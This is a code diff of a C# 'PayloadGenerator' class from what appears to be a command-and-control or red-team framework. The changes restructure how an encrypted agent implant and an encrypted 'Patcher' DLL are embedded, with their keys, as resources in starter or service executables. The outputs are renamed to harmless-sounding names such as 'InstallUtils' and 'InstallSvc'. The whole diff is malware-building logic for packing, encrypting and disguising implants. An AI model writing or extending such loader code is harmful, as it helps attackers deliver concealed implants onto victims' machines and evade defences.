@@ -16,11 +16,9 @@ using Common.Config;
 public partial class PayloadGenerator
 {
     public const string AgentSrcFile = "Agent.exe";
-    public const string DecoderSrcFile = "DecoderDll.dll";
     public const string StarterSrcFile = "Starter.exe";
     public const string ServiceSrcFile = "Service.exe";
-    public const string PatcherSrcFile = "PatcherDll.dll";
-    public const string LibrarySrcFile = "Library.dll";
+    public const string PatcherSrcFile = "Patcher.dll";
 
     public const string NimExecScript = "Payload";
 
@@ -271,23 +269,9 @@ public partial class PayloadGenerator
         var agentb64 = this.Encode(encAgent.Encrypted);
 
 
-        this.MessageSent?.Invoke(this, $"Creating Decoder...");
-        //Create DEcoder for agent
-        var decDll = LoadAssembly(this.Source(DecoderSrcFile, options.Architecture));
-        decDll = AssemblyEditor.ReplaceRessources(decDll, new Dictionary<string, object>()
-        {
-            { "Payload", Encoding.UTF8.GetBytes(agentb64) },
-            { "Key", encAgent.Secret }
-        });
-
-
         this.MessageSent?.Invoke(this, $"Creating Patcher...");
         //Create Patcher
         var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture));
-        patchDll = AssemblyEditor.ReplaceRessources(patchDll, new Dictionary<string, object>()
-        {
-            { "Payload", decDll }
-        });
 
         var encPatcher = this.Encrypt(patchDll);
         var patcherb64 = this.Encode(encPatcher.Encrypted);
@@ -299,39 +283,29 @@ public partial class PayloadGenerator
             var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture));
             starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
                     {
-                        { "Payload", Encoding.UTF8.GetBytes(patcherb64) },
-                        { "Key", encPatcher.Secret }
+                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
+                        { "PatchKey", encPatcher.Secret },
+                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
+                        { "Key", encAgent.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
             return resultAgent;
         }
         if (options.Type == PayloadType.Service)
         {
-            this.MessageSent?.Invoke(this, $"Creating Starter...");
+            this.MessageSent?.Invoke(this, $"Creating Service...");
             //Create Starter
             var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture));
             service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
                     {
-                        { "Payload", Encoding.UTF8.GetBytes(patcherb64) },
-                        { "Key", encPatcher.Secret }
+                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
+                        { "PatchKey", encPatcher.Secret },
+                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
+                        { "Key", encAgent.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
             return resultAgent;
         }
-
-        //if(options.Type == PayloadType.Library)
-        //{
-        //    this.MessageSent?.Invoke(this, $"Creating Starter...");
-        //    //Create Starter
-        //    var library = LoadAssembly(this.Source(LibrarySrcFile, options.Architecture));
-        //    library = AssemblyEditor.ReplaceRessources(library, new Dictionary<string, object>()
-        //            {
-        //                { "Payload", Encoding.UTF8.GetBytes(patcherb64) },
-        //                { "Key", encPatcher.Secret }
-        //            });
-        //    var resultAgent = AssemblyEditor.ChangeName(library, "InstallLibrary");
-        //    return resultAgent;
-        //}
 
         return null;
     }
